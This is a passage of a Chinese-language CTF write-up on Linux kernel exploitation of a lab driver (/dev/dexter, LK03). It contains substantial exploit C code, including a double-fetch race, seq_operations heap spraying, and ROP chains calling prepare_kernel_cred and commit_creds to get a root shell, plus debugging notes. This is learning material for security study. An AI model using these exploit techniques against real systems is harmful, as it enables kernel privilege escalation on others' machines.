punctuation">,</span> seq_start<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff=>0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>userland<span class="token operator">=</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x39000000</span><span class="token operator">-</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x5000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_POPULATE<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>userland<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_ESP_0x39000000_RET<span class="token punctuation">;</span><span class="token function">compete_write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"X1NRI"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/d57055110ac45482ee1e16134f068064_MD5.jpeg"></p><h2 id="四-中间出现的问题"><a href="#四-中间出现的问题" class="headerlink" title="(四)中间出现的问题"></a>(四)中间出现的问题</h2><ul><li><p>问题1、我在double fetch时一直失败，如下是我当时的竞争相关代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span><span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dexter_read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">request_t</span> structure<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50001</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>structure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dexter_write</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">request_t</span> structure<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50002</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>structure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">request_t</span> structure<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>structure<span class="token punctuation">.</span>len<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">request_t</span> structure<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token operator">&amp;</span>structure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">int</span> try_times<span class="token operator">=</span><span class="token number">0x10000</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>try_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>structure<span class="token punctuation">.</span>len<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token function">dexter_read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> structure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>structure<span class="token punctuation">.</span>ptr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>leak<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>win<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>              <span class="token function">pthread_join</span><span class="token punctuation">(</span>compete_id<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//spray</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 50 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/dexter Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 50 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//leak</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">request_t</span> content<span class="token punctuation">;</span>content<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span><span class="token function">compete_read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目前错误原因不明</p></li><li><p>问题2、当执行用户态布置的ropchain时，到<code>prepare_kernel_cred</code>这个gadget时一直panic：<code>double_fault</code><br><img src="/EXP_FILE/8135dbdaa9a7a9173f1e98540ad2fcbb_MD5.jpeg"></p></li></ul><p>后来查明了原因，这是我使用的mmap代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>userland<span class="token operator">=</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x39000000</span><span class="token operator">-</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x5000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS <span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>正确的mmap如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>userland<span class="token operator">=</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x39000000</span><span class="token operator">-</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x5000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_POPULATE<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加了<code>MAP_POPULATE</code>标志位，它的意思是对映射的文件进行预读，并且建立内存页表映射。用于提前将文件内容映射到内存区域。如果不设置该标志位，Linux在调用 <code>mmap</code> 时并不会立即为进程分配物理内存空间。只有在真正访问地址空间时，发现数据不存在于物理内存时，才会触发缺页中断，将缺失的页换入内存空间。但如果设置了 <code>MAP_POPULATE</code>，则会预先将文件内容加载到映射区域，避免了后续的缺页中断。</p><ul><li>问题3、在root权限下我的exp成功了，但在非root权限下出现内核恐慌</li></ul><p>原因是在堆喷seq_operations结构体时，是以读写打开的设备：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这是因为在普通用户权限下我们没有对该设备的写权限</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="二、LK03-smep-smap-kpti-kaslr"><a href="#二、LK03-smep-smap-kpti-kaslr" class="headerlink" title="二、LK03 +smep, +smap,  kpti,  kaslr"></a>二、LK03 +smep, +smap,  kpti,  kaslr</h1><h2 id="一-利用思路"><a href="#一-利用思路" class="headerlink" title="(一) 利用思路"></a>(一) 利用思路</h2><h3 id="pt-regs构造通用kROP"><a href="#pt-regs构造通用kROP" class="headerlink" title="pt_regs构造通用kROP"></a>pt_regs构造通用kROP</h3><p>内核中系统调用的处理入口是<a href="https://elixir.bootlin.com/linux/v5.17.1/source/arch/x86/entry/entry_64.S"><code>entry_SYSCALL_64</code></a>，其中包含这样一条指令：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">PUSH_AND_CLEAR_REGS rax<span class="token operator">=</span>$<span class="token operator">-</span>ENOSYS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据Linux源码，<a href="https://elixir.bootlin.com/linux/v5.17.1/source/arch/x86/entry/calling.h#L117">PUSH_AND_CLEAR_REGS</a>是一个汇编宏，包含<code>PUSH_REGS</code>和<code>CLEAR_REGS</code>两个宏，其中<code>PUSH_REGS</code>会将寄存器压栈：</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.macro PUSH_REGS rdx&#x3D;%rdx rax&#x3D;%rax save_ret&#x3D;0.if \save_retpushq%rsi&#x2F;* pt_regs-&gt;si *&#x2F;movq8(%rsp), %rsi&#x2F;* temporarily store the return address in %rsi *&#x2F;movq%rdi, 8(%rsp)&#x2F;* pt_regs-&gt;di (overwriting original return address) *&#x2F;.elsepushq   %rdi&#x2F;* pt_regs-&gt;di *&#x2F;pushq   %rsi&#x2F;* pt_regs-&gt;si *&#x2F;.endifpushq\rdx&#x2F;* pt_regs-&gt;dx *&#x2F;pushq   %rcx&#x2F;* pt_regs-&gt;cx *&#x2F;pushq   \rax&#x2F;* pt_regs-&gt;ax *&#x2F;pushq   %r8&#x2F;* pt_regs-&gt;r8 *&#x2F;pushq   %r9&#x2F;* pt_regs-&gt;r9 *&#x2F;pushq   %r10&#x2F;* pt_regs-&gt;r10 *&#x2F;pushq   %r11&#x2F;* pt_regs-&gt;r11 *&#x2F;pushq%rbx&#x2F;* pt_regs-&gt;rbx *&#x2F;pushq%rbp&#x2F;* pt_regs-&gt;rbp *&#x2F;pushq%r12&#x2F;* pt_regs-&gt;r12 *&#x2F;pushq%r13&#x2F;* pt_regs-&gt;r13 *&#x2F;pushq%r14&#x2F;* pt_regs-&gt;r14 *&#x2F;pushq%r15&#x2F;* pt_regs-&gt;r15 *&#x2F;UNWIND_HINT_REGS.if \save_retpushq%rsi&#x2F;* return address on top of stack *&#x2F;.endif.endm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在栈中形成一个<a href="https://elixir.bootlin.com/linux/v5.17.1/source/arch/x86/include/asm/ptrace.h#L59"><code>pt_regs</code>结构体</a>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token operator">*</span> unless syscall needs a complete<span class="token punctuation">,</span> fully filled <span class="token string">"struct pt_regs"</span><span class="token punctuation">.</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r15<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r14<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r13<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r12<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> bp<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> bx<span class="token punctuation">;</span><span class="token comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r11<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r10<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r9<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r8<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> ax<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> cx<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> dx<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> si<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> di<span class="token punctuation">;</span><span class="token comment">/* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it's IRQ number: */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> orig_ax<span class="token punctuation">;</span><span class="token comment">/* Return frame for iretq */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> ip<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> cs<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> sp<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> ss<span class="token punctuation">;</span><span class="token comment">/* top of stack page */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二-EXP"><a href="#二-EXP" class="headerlink" title="(二)EXP"></a>(二)EXP</h2><p>通过gdb调试，在劫持执行流时离布置的pt_regs有0x170字节，作者找到了这样一个gadget：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0xffffffff810bf813</span><span class="token operator">:</span> add rsp<span class="token punctuation">,</span> <span class="token number">0x140</span><span class="token punctuation">;</span> mov eax<span class="token punctuation">,</span>r9d<span class="token punctuation">;</span> pop rbx<span class="token punctuation">;</span> pop r12<span class="token punctuation">;</span> pop r13<span class="token punctuation">;</span> pop r14<span class="token punctuation">;</span> pop r15<span class="token punctuation">;</span> pop rbp<span class="token punctuation">;</span> ret<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>0x140+6次pop正好是0x170</p><p>然后在pt_regs上布置ropchain：</p><ul><li>跟以往不同的是我们没有在栈上放存储的用户态寄存器值，因为<code>pt_regs</code>结构体的末尾恰好提供了用户态寄存器上下文信息，因此不必像以往的ROP一样把它们放在栈上（这里的空间也不够）。</li><li>我们使用的<code>swapgs_restore_regs_and_return_to_usermode</code>不跟以前一样在+22处，而是在+18处。这是因为我们还需要pop掉pt_regs上r8到ip之间无用的寄存器值，总共6个。从+18开始正好进行4+2次pop</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token class-name">size_t</span> POP_RDI_RET<span class="token operator">=</span><span class="token number">0xffffffff8109b0cd</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> MOV_RDI_RAX_REP_MOVSQ_RET<span class="token operator">=</span><span class="token number">0xffffffff8163d0ab</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> POP_RCX_RET<span class="token operator">=</span><span class="token number">0xffffffff8110d88b</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ADD_RSP_0X140_P6_RET<span class="token operator">=</span><span class="token number">0xffffffff810bf813</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> POP_RBX_RET<span class="token operator">=</span><span class="token number">0xffffffff81290240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff810729b0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff81072810</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token keyword">int</span> tmp_fd<span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> 